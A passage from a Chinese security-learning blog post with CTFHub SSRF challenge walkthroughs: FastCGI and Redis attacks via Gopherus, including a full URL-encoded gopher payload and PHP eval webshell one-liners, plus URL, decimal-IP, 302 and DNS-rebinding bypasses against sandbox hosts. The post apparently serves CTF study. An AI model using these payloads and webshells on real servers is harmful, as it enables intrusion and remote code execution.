+<span class="line"><span>那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）</span></span></code></pre>
+<p>这里我们需要用到一个Gopherus工具生成fastcgi的payloald：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>利用条件：</span></span>
+<span class="line"><span>libcurl版本>=7.45.0</span></span>
+<span class="line"><span>PHP-FPM监听端口</span></span>
+<span class="line"><span>PHP-FPM版本 >= 5.3.3</span></span>
+<span class="line"><span>知道服务器上任意一个php文件的绝对路径</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>python2 gopherus.py --exploit fastcgi //必须是python2的版本</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>第一个地方输入：</span></span>
+<span class="line"><span>一个已知存在的php文件如/var/www/html/index.php  </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>第二个地方输入：</span></span>
+<span class="line"><span>希望目标服务器执行的恶意命令，比如echo PD9waHAgQGV2YWwoJF9QT1NUWydjbGF5J10pOz8+ | base64 -d > /var/www/html/shell.php  或者  ls/cat f*</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/gopherus.png" class="" title="gopherus"></p>
+<p>输出的payload还需要 经过一次URL编码;</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2f%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2f1.1%250E%2502CONTENT_LENGTH59%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2f%2finput%250F%2517SCRIPT_FILENAME%2fvar%2fwww%2fhtml%2findex.php%250D%2501DOCUMENT_ROOT%2f%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253B%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2ff%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/succes.png" class="" title="succes"></p>
+<h3 id="redis协议"><a class="anchor" href="#redis协议">#</a> Redis协议：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!</span></span></code></pre>
+<p>这一道题依然可以用gopherus工具：</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/redis.png" class="" title="redis"></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>python2 gopherus.py --exploit redis</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>第一个地方输入：</span></span>
+<span class="line"><span>这里选择是反弹shell还是正向shell         //这题phpshell</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>第二个地方输入：</span></span>
+<span class="line"><span>服务器根目录，默认为/var/www/html，可以直接回车</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>第三个地方输入：</span></span>
+<span class="line"><span>后门代码比如：&#x3C;?php @eval($_POST['cmd']) ?>         //默认写入根目录的shell.php</span></span></code></pre>
+<p>这里写入代码还是写入一句话木马吧，我尝试了&lt;?php system('cat  /f*'); ?&gt;似乎不会回显flag</p>
+<p>然后我们可以使用蚁剑连接了：</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/ant.png" class="" title="ant"></p>
+<p>最后能在根目录下找到flag</p>
+<p>从其他文章中看到了这些内容：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Redis是一个key-value存储系统。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</span></span>
+<span class="line"><span>Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。，也可以直接写入Webshell或者写入计划任务进行反弹shell。</span></span></code></pre>
+<h3 id="url-bypass"><a class="anchor" href="#url-bypass">#</a> URL Bypass：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</span></span></code></pre>
+<p>根据前面学习的绕过手法，可以使用@绕过：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://challenge-d9c668c92afb0b2b.sandbox.ctfhub.com:10800/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/url.png" class="" title="url"></p>
+<h3 id="数字ip-bypass"><a class="anchor" href="#数字ip-bypass">#</a> 数字IP Bypass：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</span></span></code></pre>
+<p>前面学了很多绕过127.0.0.1的，随便挑一个不包含127,172，@，.来用就行：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://challenge-9d998ea99bded3ea.sandbox.ctfhub.com:10800/?url=http://2130706433/flag.php</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/%E8%BF%9B%E5%88%B6.png" class="" title="进制"></p>
+<p>这里我采用的进制转换</p>
+<h3 id="302跳转-bypass"><a class="anchor" href="#302跳转-bypass">#</a> 302跳转 Bypass：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/sudo.png" class="" title="sudo"></p>
+<p>如果我们想要自己搭建一个重定向网站呢？</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>//shell.php</span></span>
+<span class="line"><span>&#x3C;?php </span></span>
+<span class="line"><span>header("Location:http://127.0.0.1/flag.php");</span></span></code></pre>
+<p>我们<strong>需要将这个php放在公网上</strong>，拼接到url访问，就能实现302跳转</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>payload：?url=http://[公网IP]/shell.php</span></span></code></pre>
+<h3 id="dns重绑定-bypass"><a class="anchor" href="#dns重绑定-bypass">#</a> DNS重绑定 Bypass：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</span></span></code></pre>
+<p>附件地址：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89426041">浅谈DNS重绑定漏洞 - 知乎</a></p>
+<p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p>
+<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。</p>
+<p>要完成DNS重绑定，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行了，完整的攻击流程为：</p>
+<ol>
+<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
+<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
+<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
+<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
+</ol>
+<p>需要用到的网址：<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
+<p>这个网站会随机指向两个绑定地址的其中一个，由于127段是回环地址，将AB设置成<code>127.0.0.1</code>和<code>127.0.0.2</code>，每一个都能访问localhost</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/DNS.png" class="" title="DNS"></p>
+<p>IP会在A、B两个之间反复切换。我们知道，127.201.205.254=127.0.0.1 <a target="_blank" rel="noopener" href="//127.0.0.0/8%E6%98%AF%E4%B8%80%E4%B8%AA%E7%8E%AF%E5%9B%9E%E5%9C%B0%E5%9D%80%E7%BD%91%E6%AE%B5%EF%BC%8C%E4%BB%8E127.0.0.1">//127.0.0.0/8是一个环回地址网段，从127.0.0.1</a> ~ 127.255.255.254都表示localhost，所以A和B都能进内网。</p>
+<p>所以我们的payload为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://challenge-aca6454dc93fb620.sandbox.ctfhub.com:10800/?url=http://7f000001.7f000002.rbndr.us/flag.php</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/dns2.png" class="" title="dns2"></p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-06-01 22:59:11" itemprop="dateModified" datetime="2026-06-01T22:59:11+08:00">2026-06-01</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/02/12/SSRF/" title="SSRF">https://zlaryy.top/2026/02/12/SSRF/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"></div><div class="item right"><a href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture2.webp" title="php反序列化"><span class="type">下一篇</span><h3>php反序列化</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf"><span class="toc-number">1.</span> <span class="toc-text"> SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text"> 相关的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text"> 各种协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 绕过手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfhub%E4%B8%8A%E7%9A%84ssrf%E9%A2%98%E7%9B%AE"><span class="toc-number">1.4.</span> <span class="toc-text"> CTFHub上的SSRF题目：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 内网访问：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 伪协议读取文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 端口扫描：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.4.</span> <span class="toc-text"> POST请求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.5.</span> <span class="toc-text"> 上传文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.6.</span> <span class="toc-text"> FastCGI协议：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.7.</span> <span class="toc-text"> Redis协议：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url-bypass"><span class="toc-number">1.4.8.</span> <span class="toc-text"> URL Bypass：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97ip-bypass"><span class="toc-number">1.4.9.</span> <span class="toc-text"> 数字IP Bypass：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#302%E8%B7%B3%E8%BD%AC-bypass"><span class="toc-number">1.4.10.</span> <span class="toc-text"> 302跳转 Bypass：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-bypass"><span class="toc-number">1.4.11.</span> <span class="toc-text"> DNS重绑定 Bypass：</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">22</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/09/05/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART4/">常规外网打点-PART4</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/07/XXE/">XXE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/24/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/19/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/28/RCE/">RCE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/12/SSRF/">SSRF</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/20/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EPython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pickle反序列化与Python原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/">低版本php下信息泄露的CVE漏洞与反弹shell</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/09/24/AI%20Security%E5%9F%BA%E7%A1%80/">AI Security基础</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART1/">常规外网打点-PART1</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">611k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">9:16</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/02/12/SSRF/`,
+    favicon: {
+        show: `ZLARYY`,
+        hide: `ZLARYY`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script><!-- hexo injector body_end start -->
+<script id="post-stats">
+(function () {
+  var API_NAME = 'ZLARYYPostStats';
+  var BOX_SELECTOR = '.post-stats-box';
+  var COUNT_LIMIT = 9999;
+
+  if (window[API_NAME] && typeof window[API_NAME].run === 'function') {
+    window[API_NAME].run();
+    return;
+  }
+
+  function isPostPage() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function storageKey(prefix) {
+    return prefix + window.location.pathname;
+  }
+
+  function getStorageValue(storage, key) {
+    try {
+      return storage.getItem(key);
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function setStorageValue(storage, key, value) {
+    try {
+      storage.setItem(key, value);
+    } catch (error) {}
+  }
+
+  function removeStorageValue(storage, key) {
+    try {
+      storage.removeItem(key);
+    } catch (error) {}
+  }
+
+  function readCount(key) {
+    var raw = getStorageValue(window.localStorage, key);
+    var value = raw === null || raw === '' ? 0 : Number(raw);
+
+    if (!Number.isInteger(value) || value < 0 || value > COUNT_LIMIT) {
+      value = 0;
+      setStorageValue(window.localStorage, key, '0');
+    }
+
+    return value;
+  }
+
+  function writeCount(key, value) {
+    setStorageValue(window.localStorage, key, String(value));
+  }
+
+  function bumpViewCount() {
+    var countKey = storageKey('zlaryy_view_count_');
+    var sessionKey = storageKey('zlaryy_viewed_session_');
+    var count = readCount(countKey);
+
+    if (getStorageValue(window.sessionStorage, sessionKey) !== '1') {
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      writeCount(countKey, count);
+      setStorageValue(window.sessionStorage, sessionKey, '1');
+    }
+
+    return count;
+  }
+
+  function readLikeCount() {
+    return readCount(storageKey('zlaryy_like_count_'));
+  }
+
+  function hasLiked() {
+    return getStorageValue(window.localStorage, storageKey('zlaryy_liked_')) === '1';
+  }
+
+  function saveLikeState(count, liked) {
+    writeCount(storageKey('zlaryy_like_count_'), count);
+    if (liked) {
+      setStorageValue(window.localStorage, storageKey('zlaryy_liked_'), '1');
+    } else {
+      removeStorageValue(window.localStorage, storageKey('zlaryy_liked_'));
+    }
+  }
+
+  function clearRewardNodes() {
+    document.querySelectorAll('.reward').forEach(function (reward) {
+      reward.innerHTML = '';
+      reward.classList.add('post-stats-host');
+      reward.removeAttribute('style');
+      reward.setAttribute('aria-label', 'post stats');
+    });
+  }
+
+  function findInsertTarget() {
+    var reward = document.querySelector('article.post .reward, .reward');
+    if (reward) return { parent: reward, before: null };
+
+    var footer = document.querySelector('article.post > footer');
+    if (footer && footer.parentNode) return { parent: footer.parentNode, before: footer };
+
+    var article = document.querySelector('article.post');
+    if (article) return { parent: article, before: null };
+
+    return null;
+  }
+
+  function createStatsBox(viewCount, likeCount, liked) {
+    var box = document.createElement('div');
+    box.className = 'post-stats-box';
+    box.innerHTML = [
+      '<button class="post-view-count" type="button" disabled aria-disabled="true">',
+      '&#128065; &#x770b;&#x8fc7; <span class="local-view-count">' + viewCount + '</span> &#x6b21;',
+      '</button>',
+      '<button class="post-like-btn' + (liked ? ' liked' : '') + '" type="button" aria-pressed="' + (liked ? 'true' : 'false') + '">',
+      '<span class="post-like-label">' + (liked ? '&#x5df2;&#x70b9;&#x8d5e;' : '&#x70b9;&#x8d5e;') + '</span> ',
+      '<span class="local-like-count">' + likeCount + '</span>',
+      '</button>'
+    ].join('');
+
+    return box;
+  }
+
+  function updateLikeButton(button, count, liked) {
+    var labelNode = button.querySelector('.post-like-label');
+    var countNode = button.querySelector('.local-like-count');
+
+    if (labelNode) labelNode.textContent = liked ? '\u5df2\u70b9\u8d5e' : '\u70b9\u8d5e';
+    if (countNode) countNode.textContent = String(count);
+
+    button.classList.toggle('liked', liked);
+    button.setAttribute('aria-pressed', liked ? 'true' : 'false');
+  }
+
+  function bindLikeButton(box) {
+    var button = box.querySelector('.post-like-btn');
+    if (!button || button.dataset.bound === 'true') return;
+
+    updateLikeButton(button, readLikeCount(), hasLiked());
+
+    button.dataset.bound = 'true';
+    button.addEventListener('click', function () {
+      var count = readLikeCount();
+
+      if (hasLiked()) {
+        count = Math.max(0, count - 1);
+        saveLikeState(count, false);
+        updateLikeButton(button, count, false);
+        return;
+      }
+
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      saveLikeState(count, true);
+      updateLikeButton(button, count, true);
+    });
+  }
+
+  function renderStats() {
+    if (!isPostPage()) return;
+
+    clearRewardNodes();
+
+    var viewCount = bumpViewCount();
+    var likeCount = readLikeCount();
+    var liked = hasLiked();
+    var box = document.querySelector(BOX_SELECTOR);
+
+    if (!box) {
+      var target = findInsertTarget();
+      if (!target) return;
+
+      box = createStatsBox(viewCount, likeCount, liked);
+      target.parent.insertBefore(box, target.before);
+    }
+
+    var viewNode = box.querySelector('.local-view-count');
+    var likeNode = box.querySelector('.local-like-count');
+    var likeButton = box.querySelector('.post-like-btn');
+
+    if (viewNode) viewNode.textContent = String(viewCount);
+    if (likeNode) likeNode.textContent = String(likeCount);
+    if (likeButton) {
+      updateLikeButton(likeButton, likeCount, liked);
+    }
+
+    bindLikeButton(box);
+  }
+
+  function runPostStats() {
+    window.setTimeout(renderStats, 0);
+  }
+
+  window[API_NAME] = {
+    run: runPostStats
+  };
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', runPostStats);
+  } else {
+    runPostStats();
+  }
+
+  document.addEventListener('pjax:complete', runPostStats);
+})();
+</script>
+  
+<script>
+(function () {
+  function addBeian() {
+    const footerStatus = document.querySelector('#footer .status');
+    if (!footerStatus) return;
+
+    if (document.querySelector('.footer-beian')) return;
+
+    const beian = document.createElement('div');
+    beian.className = 'footer-beian';
+    beian.innerHTML = '<a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener">蜀ICP备2026016552号-1</a>';
+
+    footerStatus.appendChild(beian);
+  }
+
+  addBeian();
+  document.addEventListener('pjax:complete', addBeian);
+})();
+</script>
+  <script>
+(function () {
+  function fixText(text) {
+    if (!text) return text;
+    text = text.replace(/\([`´]?Д[`´]?\)大変だ!/g, "ZLARYY");
+    text = text.replace(/大変だ!/g, "ZLARYY");
+    return text;
+  }
+
+  function replaceText(root) {
+    root = root || document.body;
+    if (!root) return;
+
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+    var node;
+
+    while ((node = walker.nextNode())) {
+      var oldText = node.nodeValue;
+      var newText = fixText(oldText);
+      if (newText !== oldText) node.nodeValue = newText;
+    }
+  }
+
+  function init() {
+    replaceText(document.body);
+
+    var observer = new MutationObserver(function (mutations) {
+      mutations.forEach(function (mutation) {
+        mutation.addedNodes.forEach(function (node) {
+          if (node.nodeType === 1) {
+            replaceText(node);
+          } else if (node.nodeType === 3) {
+            node.nodeValue = fixText(node.nodeValue);
+          }
+        });
+      });
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
+</script><!-- hexo injector body_end end --></body></html>
